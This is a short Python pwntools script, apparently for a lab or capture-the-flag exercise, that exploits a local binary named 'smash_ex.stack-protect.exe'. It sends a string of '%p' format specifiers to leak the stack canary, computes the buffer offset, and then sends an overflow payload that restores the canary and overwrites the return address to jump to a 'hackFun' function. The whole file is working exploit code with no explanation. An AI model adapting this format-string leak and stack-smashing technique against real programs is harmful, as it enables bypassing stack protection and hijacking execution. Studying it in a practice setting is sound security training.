#!/usr/bin/python3


# Import everything in the pwntools namespace
from pwn import *
from ast import literal_eval

binary = pwnlib.elf.load('smash_ex.stack-protect.exe')
fun_addr = binary.symbols['hackFun']
print("fun addr", fun_addr, hex(fun_addr))

# Create an instance of the process to talk to
io = process('./smash_ex.stack-protect.exe')
print(io.readlines(1))

# %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
io.send('%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'.encode('utf-8'))

out = io.readlines(2)
print(out[0])

outs = out[0].decode('utf-8').split(' ')
#canary = 0xcb243fc821f8aa00
canary = literal_eval(outs[18])
buf_start = 0x7025207025207025

i = outs.index(str(hex(canary))) - outs.index(str(hex(buf_start)))
print(i)
# need to dynamically figure this out

bytes_to_send = b'abcdefgh'*i + p64(canary, 'little') + p64(0, 'little') + p64(fun_addr, 'little')
io.send(bytes_to_send)
print(io.readall())
